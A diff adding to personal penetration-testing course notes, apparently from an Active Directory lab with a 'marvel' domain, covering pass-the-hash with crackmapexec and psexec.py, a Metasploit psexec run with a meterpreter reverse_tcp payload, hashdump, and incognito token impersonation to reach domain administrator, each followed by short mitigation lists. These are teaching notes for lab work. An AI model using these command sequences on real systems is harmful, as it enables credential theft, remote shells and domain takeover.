@@ -227,6 +227,51 @@
 * NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
 * copy second part of the hash then run it in crackmapexec `crackmapexec smb IP-range -u username -H paste_hash_here --local-auth`
 * see it's gonna try to pass it around the network and gain access, green plus sign indicates in succeed
+* psexec.py "frank castle":@192.168.57.141 -hashes <HASH here, first and second part of hash needed>
+
+### Mitigations
+
+* Limit account re-use
+* Utilize strong passwords (> 14 characters)
+* Privilege Access Management (PAC)
+
+### Token Impersonation Attacks
+
+#### What are tokens?
+
+* Temporary keys that allows you to access to a system/network without having to provide credentials each time you access a file. Like cookies for computers.
+* Two types:
+1. Delegate - created for logging in to a machine or using Remote Desktop
+2. Impersonate - "non-interactive" such as attaching a network drive or a domain logon script.
+
+#### Using Metasploit
+
+* `use /exploit/windows/smb/psexec/`
+* `options`
+* `set rhosts <target IP>`
+* `set smbdomain domain.local`
+* `set smbpass password`
+* `set smbuser username`
+* `show targets`
+* `set target 2`
+* `set payload windows/x64/meterpreter/reverse_tcp`
+* `options` and set the lhost and lport
+
+* `getuid`
+* `hashdump`
+* we can load incognito `load incognito`
+* `help` to see options
+* `list tokens`
+* `impersonate token marvel\\administrator`
+* `whoami` : marvel\administrator
+
+#### Mitigation
+
+* Limit User/Group token creation permissions
+* Account tiering
+* Local Admind restriction
+
+
 
 # finish section 19/132
 
